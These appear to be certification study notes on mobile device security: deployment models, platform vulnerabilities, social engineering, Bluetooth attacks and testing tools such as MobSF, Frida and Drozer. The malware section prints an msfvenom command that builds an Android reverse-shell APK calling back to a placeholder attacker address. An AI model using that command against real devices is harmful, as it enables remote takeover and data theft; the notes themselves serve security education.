## Lesson Introduction
---
Today, a large percentage of the world uses some type of mobile device. Many organizations provide corporate-owned or corporate-compliant devices for their employees. As a result, it's essential to recognize mobile device vulnerabilities that include business logic, patching fragmentation, and weak passwords, along with insecure storage. Because of this, devices can fall victim to several attacks that can lead to data compromise, such as overreach of permissions and execution of activities using root. To prevent attacks, the team should test mobile devices using tools such as mobile security framework and Drozer.

## Lesson Objectives

In this lesson, you will:

- Understand the types of vulnerabilities inherent to mobile devices and recognize the importance of testing organizational equipment.
- Paraphrase the various attacks on mobile devices such as malware, phishing, over-reach of permissions, Bluejacking, and Bluesnarfing.

> [!note] Exam Objectives Covered
> *3.5 Explain common attacks and vulnerabilities against specialized systems.*

Mobile devices have replaced computers for managing day-to-day tasks such as accessing business and cloud-based applications. Along with this widespread use and convenience comes the threat of an attack against the infrastructure by accessing sensitive information via an employee’s smart phone or tablet. In this section, we’ll take a look at the variety of methods companies use to control access and manage enterprise mobile devices. In addition, we’ll identify the many vulnerabilities specific to an OS, or to mobile devices in general.

Let’s start with covering the different methods used to deploy mobile devices.

### Comparing Deployment Models
---
Many companies adhere to a structured mobile device implementation model, which describes the way employees are provided with devices and applications. Deployment models can include the following:

- **Bring your own device (BYOD)**—the mobile device is owned by the employee; however, it must be corporate compliant in terms of OS version and functionality.
- **Corporate owned, business only (COBO)**—the device is the property of the company and may only be used for company business.
- **Corporate owned, personally enabled (COPE)**—the device is supplied and owned by the company. The employee may use it to access personal email, social media, and web browsing; however, they must be compliant with any acceptable use policies in force.
- **Choose your own device (CYOD)**—much the same as COPE; however, the employee can select a device from a curated list.

Of all the models, BYOD is usually the most popular with employees. However, it poses the most difficulty for security and network managers. Since an employee's personal property is out of the employer's control, it is difficult to account for every threat involved with these devices. As a result, when using this model, the employee will have to agree on the installation of corporate apps that provide oversight and auditing.

Regardless of the deployment model, the device must be configured to control access. Let’s compare some of the methods used to achieve this goal.

#### Controlling Access
Because of the widespread use of portable devices in an organization, access control on a mobile device must be a top priority. If a threat actor is able to bypass the security of a smartphone or tablet, they can potentially gain access to personal and corporate information. In addition to confidential files that might be stored on the device, there are often cached passwords for services such as email, remote access VPN, and/or company portals.

Today, the majority of smartphones and tablets are single-user devices. Access control will prevent unauthorized users from accessing the device, which can be accomplished in many ways, that include:

- What you know, such as a password, passphrase, or PIN
- What you have, such as a smart card or Universal Serial Bus (USB) token
- What you are (biometric), such as a fingerprint, iris pattern, facial or voice recognition
- What you do, such as a swipe pattern
- Where you are, such as trusted physical or logical location
- What conditions are present (context-aware), such as geolocation, time or type of device

Even with properly implemented access control methods, the device might still be vulnerable. For example, an employee has downloaded, installed, and given permission to an app that now leaves the device vulnerable. Or an employee has failed to install the latest patches and updates that will help improve the security of the device.

Because of the wide range of possible threats to mobile devices, many organizations require the client to allow corporate oversight in the form of mobile device and app management. Let’s explore this concept, next.

#### Managing Enterprise Mobility
***Enterprise mobility management (EMM)*** is a class of management software designed to apply security policies to mobile devices and apps in the enterprise. The challenge of identifying and managing attached and mobile devices is often referred to as visibility. EMM software can be used to manage enterprise-owned devices as well as BYOD to ensure complete visibility. The two main functions of an EMM product suite are as follows:

- **Mobile _device_ management (MDM)**—sets device policies for authentication, feature use, such as camera and microphone, and connectivity. MDM can also allow device resets and ***remote wipes***.
- **Mobile _application_ management (MAM)**—sets policies for apps that can prevent unauthorized apps from being installed, automatically push out updates, and enable clients to select from a list of corporate compliant apps to be installed.

The core functionality of endpoint management suites extends the concept of ***network access control (NAC)*** solutions. Once a device is enrolled with management software, it can be configured with policies that properly process corporate data and prevent data transfer to personal apps.

The management software logs the use of a device on the network and determines whether to allow it to connect or not, based on administrator-set parameters and policies. The solutions are often cloud-based platforms that allow administrators to work from a centralized console and provide remote access to managed devices. Common features include:

- Enrolling and authenticating devices
- Locking and wiping the device.
- Pushing out OS, app, and firmware updates to devices
- Locating devices through Global Positioning Software (GPS) and other technologies
- Preventing root access or jailbreaking devices
- Creating an encrypted container to keep sensitive organization data compartmentalized
- Restricting certain features and services based on access control policies

This level of granular control is essential in ensuring the security of the infrastructure as it can allow the ***computer security incident response team (CSIRT)*** to move quickly and mitigate any residual effects of a security breach.

For example, if a manager reports their phone is misplaced or stolen, the CSIRT can remotely wipe the device from the management console. This will help prevent the threat of data exfiltration of sensitive company information.

In addition to remotely wiping the phone, the management software can be configured to trigger other events. Events can include backing up data from the phone to a server first and then displaying a "Lost/stolen phone—return to XX" message on the handset.

While managing mobile devices is important, it’s also essential to be aware of the many vulnerabilities that can exist when dealing with mobile devices.

### Identifying Vulnerabilities
---
A vulnerability is a weakness or flaw that can be exploited by a threat in order to modify the integrity of a system. When dealing with mobile devices, there are a number of different vulnerabilities. Some occur during development, some while using the device, and others are a result of user interaction. In this section, we’ll review some inherent weaknesses that exist in either iOS or Android smartphones, and then cover threats common to all mobile devices.

Let’s start with a review of vulnerable characteristics of iOS and Android devices.

#### Distinguishing Specific Mobile Platforms
Mobile operating systems each present different approaches to security. For either an Android or iPhone, there can be significant threats that target the operating system.

The vast majority of threats targeted at mobile platforms affect Android devices, which represent the largest market share. Android devices can fall victim to attack for several reasons, that include:

- Using older OS versions with unpatched vulnerabilities
- Customizing the operating system
- Using third-party apps

Many of the threats occur because users obtain apps from an unofficial source rather than from the Google Play store. This is because when using an Android device, the user can download an app from any source. If there isn’t a way to check the validity of an app, a user might inadvertently download and install a bogus app instead of a legitimate one. Once installed, the app can steal the user's credentials or gain root access to the device.

However, when using an Apple iPhone, you can only download apps from the official App Store. To circumvent this restriction, users ***jailbreak*** their phone, which removes the protective seal and any OS specific restrictions to give users greater control over the device. Jailbreaking poses a significant threat. <mark style="background: #FFF3A3A6;">Once a device is jailbroken, any application can read and write to the root file system. In addition, the OS will run unsigned code, which is normally prevented by Apple.</mark>

In addition to general OS vulnerabilities, there are several threats related to the business logic process. Let’s review this concept, next.

#### Recognizing Threats to Business Logic
When configuring enterprise mobile devices, it’s important to be aware of the **business logic process.** The business logic process represents the flow of information from the time the user requests access to the time the request hits a resource. A vulnerability can exist in any of the steps taken to access the resource, and can include the ability to modify cookies, escalate privilege, and circumvent controls.

In an environment where there are multiple types of mobile devices, including BYOD, the organization can face numerous threats and vulnerabilities. Some are related to the physical nature of the devices, and can include the following issues:

- **Deperimeterization**—employees that take sensitive data outside of the corporate perimeter and do not properly secure their devices will risk data exfiltration.
- **Strained infrastructure**—the addition of multiple devices can place a strain on the network and cause it to stop functioning at optimum capacity and may lead to an unintentional DoS.
- **Forensics complications**—dealing with BYOD during a forensic exercise may prove difficult or even impossible and compromise the integrity of an investigation.
- **Lost or stolen devices**—unencrypted data on a phone or tablet is at risk of compromise if that phone or tablet is lost or stolen.

Another threat that can affect a mobile device is ***patching fragmentation***. Device updates are often not implemented in a timely manner. In addition, an older mobile device may not be updated at all. Outdated browsers are common on mobile devices, as unlike a standard laptop, these browsers do not get consistent updates. This fragmented approach can lead to individuals using unsupported versions that leave the system vulnerable.

Other issues related to mobile devices that can affect the business logic process include the following:

- **Lack of antimalware protection**—Not only can malware infect a user's device, but it could likewise spread throughout the network when the device connects. Many mobile devices lack built-in anti-malware software.
- **Using known vulnerable components**—can occur when developers use components that have known vulnerabilities and have not thoroughly tested components and applications prior to publishing.
- **Dependency vulnerabilities**—exist as some applications on the surface are secure; however, they may have to be dependent on other applications that are vulnerable. This dependency can result in widespread vulnerabilities that can affect the entire system.
- **Mobile device storage**—might be insecure or less protected, allowing a malicious actor to gain access to sensitive data on the device.
- **Passcode vulnerabilities**—commonly occur as not all systems require frequent password changes. In some cases, the user may fail to implement any password on the device. In addition, although multi-factor authentication can be a more secure option when defending a mobile device, the user may choose not to use this option.

Wherever the vulnerabilities exist on a mobile device, they should be mitigated, as they can result in unauthorized access to protected content.

## Topic 11B - Launch Attacks on Mobile Devices
---
> [!note] Exam Objectives Covered
> *3.2 Given a scenario, research attack vectors and perform wireless attacks.*
> *3.5 Explain common attacks and vulnerabilities against specialized systems.*

Today, over one-half of the world’s population uses some type of portable electronic equipment. Along with this growth comes the continued evolution of threats. Devices include smartphones, tablets, and wearables, all of which can be susceptible to an attack.

In this section, we’ll take a look at some of the threats to mobile computing devices that take advantage of vulnerabilities. We’ll then drill down on how malicious actors can hijack a Bluetooth signal to launch a Bluejacking or Bluesnarfing attack. Finally, we’ll see that because of the prevalence of mobile devices, we need to be aware of possible malware attacks that can take place. We’ll then learn how cybersecurity professionals discover how malicious software works by reverse engineering the process.

Let’s start with a review of attacks on mobile devices.

### Comparing Attacks on Mobile Devices
---
Many of us have one or more portable devices that we use to communicate, take pictures, and store content. However, mobile devices have vulnerabilities and are susceptible to malware, spyware, and man-in the middle attacks that can lead to data exfiltration. Understanding these vulnerabilities will help you to better test and mitigate possible attacks.

In this section, we’ll take a look at threats in general to the security of a mobile device, along with learning how social engineering can play a significant role in launching an attack. We’ll start with an overview of threats to mobile devices.

#### Attacking a Mobile Device
Because of the type of activity that is done when interacting with a mobile device, there are several common attacks that can take place. One such attack is malware, which is software that serves a malicious purpose, typically installed without the user's consent or knowledge. Malicious programs are categorized in one of several different classes as follows:

- **Spyware**—records keystrokes and other activity and sends to a collection site.
- **Trojans**—appear as a useful program, such as a game or utility, but contain malware that allows hackers to take control of the victim's computer remotely.
- **Rootkits**—provide a backdoor for illegal access to a host.
- **Viruses**—can self-replicate, yet need a way to propagate to other hosts.
- **Worms**—are a virus sub-class that have the ability to spread without any help from a transport agent such as an email attachment.

The results of malware can be as simple as a new icon, or more serious results such as disabling antivirus or destroying files.

In addition to malware, features that make a mobile device more secure can pose a risk as well. For example, ***biometric integration*** on a mobile device can be a two-edged sword. If properly implemented, a biometric (such as a face or fingerprint) can be a more secure option for authenticating into a system. However, a poorly designed device might allow a malicious actor to spoof the system by presenting a forged biometric, which will allow access to the device.

We can also see **execution of activities using root**, which can occur when the user roots or jailbreaks their system to improve the performance of the device. In most cases, this action will leave the system vulnerable to an attack. For example, if a user roots a device to install a game, the game and any malicious code can now have unfettered access to root permissions and can take complete control of devices.

Related to this type of attack is **over-reach of permissions**, as it’s often up to the individual to decide what services to access when downloading and installing an app. Instead of using the principle of least privilege, a consumer may feel it is necessary to allow an app to access services and data stores that are generally restricted. It’s best to read the EULA before installing any software as hidden language concerning other programs that might be included in the download. If you do not agree, you most likely won’t be able to use the main program. In some cases, anti-malware protection will block the install anyway.

Social engineering has evolved over the years, and the widespread use of mobile devices have improved as well. Let’s see how malicious actors are counting on you to click on a link.

#### Use Social Engineering
Social engineering attacks use psychological manipulation to exploit a human's willingness to trust others. Mobile devices are prone to social engineering attacks, as malicious actor's prey on a victim’s sometimes-erroneous decision-making ability. Many times, the victim will be pressured with a sense of urgency to click on a link.

In addition to phishing, pharming, and baiting the victim, malicious actors use other techniques that are specific to mobile devices such as:

- **Vishing** is phishing using Voice over Internet Protocol (VoIP). This attack is possible as it is easy to spoof the sender information when using a VoIP call.
- **SMiShing** is a form of phishing that uses text messages to entice users to click on a link or provide information.
- **Drive by downloads** can occur while browsing the internet, as a victim can click on a link that will download malicious software. Many times, the victim is unaware of this activity.
- **Spamming** is sending unsolicited ads and calls to a mobile user, which can be done either by using a text or phone call.
- **Browser Hijackers** take a web request and send it to another search engine or display persistent advertising, with the goal of stealing information.

> [!warning] The term SMiShing stems from the acronym Short Message Service (SMS), which is a method used to send text messages to mobile phone users.

When using social engineering on a mobile device, the attack phase is much the same as any attack in that the malicious actor will generally complete the following steps:

1. Research some type of ploy that will get the victim to click on a link or complete some action. For example, use a current event or urgent notification that might possibly alarm the victim.
2. Engage the victim by leveraging the ploy, possibly sending as a phishing or SMiShing attack with the hopes that the victim will complete some action.
3. Once the victim responds, extract sensitive information, such as login credentials on a vendor account.
4. After the attack is over or has played out its useful life, remove all traces of the attack, such as any bogus ecommerce sites.

As shown in the graphic, the malicious actor can launch a SMiShing attack with a believable message to get the victim to click on a link:
![[Pasted image 20240605140803.png | 350]]
*Using social engineering on a mobile phone*

In this case, the malicious actor has sent a bogus notification that the victim has placed a significant Amazon order. Once the victim clicks cancel, the link will take them to a bogus Amazon site, where the goal is to obtain user credentials.

Mobile devices can also fall victim to spyware. Spyware comes in many different categories; all can pose a serious problem as they are designed to track your usage and capture passwords and data. A victim can get spyware on a phone by someone having physical contact with the device, or by sending a text message with a hyperlink, which can then download the spyware.

Once installed, spyware can monitor all types of activity such as text messages, social media posts, and phone calls, along with websites that were visited.

Many times, a user will pair their mobile phone with a Bluetooth-enabled device, such as ear buds, keyboards, or game controllers. Malicious actors have found a way to intercept the signals between the devices, to steal data, or download malware. Let’s explore this concept.

### Hacking a Bluetooth Signal
---
Portable phones can be used to interface with workstations using technologies such as Bluetooth or Universal Serial Bus (USB). As such, they have a greater potential for malware and other attacks such as Bluejacking and Bluesnarfing. Portable devices that store valuable information are a considerable security risk, especially when taken outside of the corporate environment.

When using a Bluetooth enabled device, you create a ***Personal Area Network (PAN)***, which is a close-range network that allows communications between devices, such as smartphones, laptops, and printers. When using a Bluetooth-enabled device, best practice techniques will minimize the potential for an attack. Techniques include:

- Keep your device non-discoverable.
- Disable Bluetooth when not using the device.
- Don’t accept unfamiliar requests to pair.
- Periodically check your list of paired devices.

However, many of us don’t follow best practice guidelines, which can allow a malicious actor to launch an attack against a Bluetooth device. Let’s first take a look at how a Bluejacking attack works.

#### Bluejacking a Signal
***Bluejacking*** is a method used by attackers to send out unwanted text messages, images, or videos to a mobile phone, tablet, or laptop using a Bluetooth connection. Bluetooth requires relatively close proximity, usually within 30 feet of the target device to be effective. However, in a busy area such as an airport, this attack is possible.

In most cases, a Bluejacking attack is typically just an annoyance. However, bluejacking can be used as a vector to carry out more insidious attacks. For example, you might be able to socially engineer a user into downloading malware or provide access credentials if you send a convincing message to their device over Bluetooth. The user may be more inclined to trust the message since Bluetooth is not as common as text or email-based phishing vectors.

Bluejacking does not require any specialized tools and can be simply performed by sending a message to nearby, discoverable devices using the attacking device's Bluetooth app.

> [!warning] Bluejacking is ineffective when devices are in non-discoverable mode.

Another attack is Bluesnarfing, which is stealing information using Bluetooth technology.

#### Stealing Data with Bluesnarfing
***Bluesnarfing*** is a more aggressive attack, as a malicious actor is able to read information from a victim's Bluetooth device. The end goal is to glean sensitive data from the victim, like their contacts, calendars, email messages, text messages, etc.

Similar to Bluejacking, Bluesnarfing is ineffective against devices that set Bluetooth in non-discoverable mode.

Because of the potential for malicious actors to install malware on a mobile device, it’s common to test the client's mobile workforce and infrastructure for weaknesses, particularly to malware.

### Exploiting with Malware
---
Mobile devices, particularly smartphones and tablets, are an important tool in many organizations. In today's world, an employee's mobile device can be an attractive target to a malicious actor. In addition to personal data, it may hold sensitive company information as well, and can be useful as an authentication mechanism to gain access to protected sites.

In this section, we’ll explore how malware is installed on a mobile device. In addition, we’ll discover why analyzing malware can be an important skill in understanding how malware works. Let’s start with an overview of how we can fall victim to a malware attack.

#### Installing Malware
When dealing with malware, the approach you take will depend heavily on the mobile platform the devices are using.

The iOS platform is more restrictive and therefore has fewer opportunities for exploitation. By default, iOS devices can only install apps from the official App Store, which has some measure of quality control to keep malware out. However, jailbreaking an iPhone enables devices to install apps from third-party sources, which might contain malware.

The Android OS is much less restrictive than iOS by design, and a change of a single setting can make it possible for the device to install apps from third-party sources. The rooting process reduces the device's security even further. Once rooted, apps will be able to run outside of their sandbox environments, assume high-level privileges, and be able to interact with the kernel and other apps on the device. This can then enable a malicious actor to exfiltrate sensitive data, capture session information, and even leave a device non-functional.

The following example uses a tool called **`msfvenom`**, part of the Metasploit Framework, to create a malicious app package for Android devices:

`msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker IP address> LPORT=<available port> R > malware.apk`

This creates a reverse TCP listener back to the attacker's machine and saves it as an app package, or APK file.

> [!warning] APK files are the installation file format for Android.

Assuming the user enables installation of apps from unknown sources, they simply need to run the installer to infect their device. On the attack machine, a malicious actor will set up Metasploit to handle the incoming connection by opening a shell onto the device.

One of the best ways to protect a system is to understand the threats. Two common techniques used to dissect a threat are reverse engineering and sandbox analysis.

#### Analyzing Malware
When dissecting malware, ***reverse engineering*** will step through the code to see what happens when the code is run on a device. One significant effort is a forensic analysis on a specific type of malware, completed by scientists to see how the code works. This effort helps identify vulnerabilities which are then used to help prevent future attacks.

Sometimes the simplest way to learn what happens when a virus executes is to put it in a sandbox and let it run. ***Sandbox analysis*** is using virtualization to provide a safe environment to analyze malware. You can create a sandbox using a virtual machine, or use a pre-made sandbox designed to provide a full analysis of malware activity.

## Topic 11C - Outline Assessment Tools for Mobile Devices
---
> [!note] Exam Objectives Covered
> *3.5 Explain common attacks and vulnerabilities against specialized systems.*

Mobile devices are widely used, yet many have several flaws that can expose a device to an attack. Unlike a threat, which we have no control over, we can minimize vulnerabilities in most cases. The first step involves testing the device. Today, the security analyst has a number of tools available to test and troubleshoot devices. Some are proprietary; however, many are free.

In this section, we’ll cover some of the tools and frameworks available to test mobile devices for security issues. We’ll outline some of the ways we can examine code with Frida and Objection, and then summarize the ways we can evaluate the behavior of an Application Programming Interface (API) using Postman.

Let’s start with an overview of the security frameworks and suites available to the PenTesting team.

### Providing a Framework
---
A large number of businesses use portable devices. As a result, it’s in a company’s best interest to PenTest their mobile devices. The team should assess vulnerabilities such as weak or missing authentication, patching fragmentation, and insecure code.

The two predominant mobile developers are Android and iOS. Although the two have similar functionality, the two are different in the following ways:

- Apple takes pride in its closed-end design and more secure nature.
- Android has a huge market share with a wide range of choices for hardware and apps.

Regardless of the manufacturer, there are plenty of testing tools available for either Android or iOS devices. One way to approach development and testing is by using a framework or model during the life cycle of the device.

#### Recognizing the Testing Life Cycle
Because of the prevalence of mobile devices, most organizations incorporate a testing framework to provide oversight and minimize risk. Within any organization, there are generally some common elements when dealing with mobile devices, as shown in the graphic below:
![[Pasted image 20240605141832.png | 400]]
*Mobile device testing framework*

Within the framework, some of the activity can include:

- **Mobile Device Assessment**—<mark style="background: #FFF3A3A6;">provides an overview of compliance and business logic issues.</mark>
- **BYOD Approval**—<mark style="background: #FFF3A3A6;">selects appropriate devices and creating policies.</mark>
- **Secure App Development**—<mark style="background: #FFF3A3A6;">creates organization specific apps in-line with organizational policy.</mark>
- **Mobile APP Testing**—<mark style="background: #FFF3A3A6;">includes Static Application Security Testing (SAST) and Dynamic Application Security Testing (DAST).</mark>

To achieve these goals, there are several options that include tools and guidelines that are part of a suite. Let’s investigate some of the choices available.

#### Selecting a Suite
Because of the prevalence of mobile devices, there have been many advances in the types of testing tools available today. Some of the suites include Kali Linux, the Mobile Security Framework (MobSF), and the OWASP Mobile Application Security Testing Guide (MASTG).

#### Kali Linux
When you need a suite of tools that has built-in apps designed to conduct penetration testing on a variety of devices, many will turn to Kali Linux. Kali is updated frequently by Offensive Security and includes applications such as:

- **Ettercap** is a suite of tools that can be used to launch various types of Man in The Middle (or on-path) attacks.
- **Android SDK tools** have packages so you can design, build, and test mobile apps for Android devices along with reverse engineering an existing device.
- **Burp Suite** is an integrated platform for testing web applications along with a mobile assistant designed to test iOS devices.

> [!warning] For a complete listing visit https://tools.kali.org/tools-listing/.

Another option that provides a comprehensive structure for testing is the Mobile Security Framework.

#### Mobile Security Framework (MobSF)
The MobSF can provide an automated evaluation of code and malware analysis using both static and dynamic analysis as follows:

- **Static analysis** can evaluate both Android and iOS.
- **Dynamic analysis** is able to assess an Android platform.

The framework conducts a thorough assessment to determine parameters such as OS reputation, whether it has been rooted or jail broken, and app security.

The Open Web Application Security Project (OWASP) provides many resources for securing and testing code and applications throughout the life cycle of a project. Another OWASP project is the Mobile Application Security Testing Guide (MASTG).

#### Mobile Application Security Testing Guide
The MASTG provides an intuitive framework that steps you through the assessment process. Key elements include:

- A dashboard to summarize testing information along with contact information
- Security recommendations for both Android and iOS devices
- Specifications for testing resiliency against reverse engineering and tampering

In addition to providing extensive checklists, you’ll also find hyperlinks for external resources. All requirements are outlined in an easy-to-read spreadsheet format, as shown below:
![[Pasted image 20240605141949.png]]
*MASTG - Security requirements for iOS*

Part of PenTesting might require the team to examine the code for vulnerabilities. Let’s see what options we have for tools when reverse engineering code.

### Examining the Code
---
When PenTesting mobile devices, many times you'll probably need tools that allow you to dive into the code so you can monitor the behavior. In addition to a collection of tools in a suite and frameworks that outline the entire testing process, there are also individual tools, along with those that work together. A couple of tools worth mentioning are Frida, Objection, and Drozer.

Let’s see how Frida and Objection complement one another.

#### Using Frida and Objection
Some tools work in symphony with one another. Two examples are the tools Frida and Objection.

***Frida*** is an open-source tool that can work with a wide range of operating systems. It includes custom developer tools that help the PenTest team during application PenTesting, as you can examine the plaintext data that is being passed. In addition, Frida has many other features that allow you to do the following:

- Dump process memory
- In-process fuzzing
- Anti-jailbreak (or root) detection
- Change a program’s behavior

When using Frida, the PenTest team can also use another powerful tool, Objection, a runtime exploration toolkit that works on iOS devices. ***Objection*** is a scriptable debugger that allows you to perform various security related tasks on unencrypted iOS applications.

With Objection, the team can run custom Frida scripts and interact with the filesystems on non-jailbroken iOS devices. It uses Frida to inject objects into an application and then monitors the behavior. <mark style="background: #FFF3A3A6;">You can also simulate a jailbroken environment and observe an iOS application within the existing constraints of a sandbox environment or dump the iOS keychain.</mark>

In addition to Frida and Objection, let’s see what other choices we have if tasked to examine the behavior of executables.

#### Debugging Applications
During the PenTest process, the team might need to decompile executables and observe their behavior. ***Drozer*** is open-source software used for testing for vulnerabilities on Android devices. Drozer is an attack framework that allows you to find security flaws in the app and devices. It works as a client-server model and lets you assume the role of an Android app so you can observe the behavior of the app as it interacts with other apps.

> [!warning] F-Secure has stopped development of the Drozer tool.

An APK file is an app designed to run on an Android device. Two Android application decompilers that work with APK files are the ***APKX tool*** and ***APK Studio***, and these can be used to monitor the behavior of an APK file. The difference is as follows:

- **APKX tool** is an Android APK decompiler that allows you to pull and analyze the Java source code to see what's going on inside.
- **APK Studio** is an integrated development environment (IDE) designed so you can decompile and/or edit an APK file.

In addition to evaluating the source code, the team may also need to assess the Application Programming Interface (API) requests. Let’s see how Postman can help with this process.

### Evaluating with Postman
---
An API is a set of commands that is used to send and receive data between systems, such as a client and a server. Prior to deployment, it’s good practice to test any APIs in your project. One tool that the team can use is ***Postman***, which provides an interactive and automatic environment used to interact and test an HTTP API.

Along with having an intuitive GUI for constructing API requests, Postman is rich with features so that you can accomplish the following:

- Explore and create an API.
- Build and run a test suite.
- Work with other team members.
- Analyze results and run reports.
- Integrate within the DevOps life cycle.

While many of the attacks can be avoided by user education and good practice techniques, it’s essential to actively test devices for vulnerabilities. As we have seen, there are many tools that can help with this process.
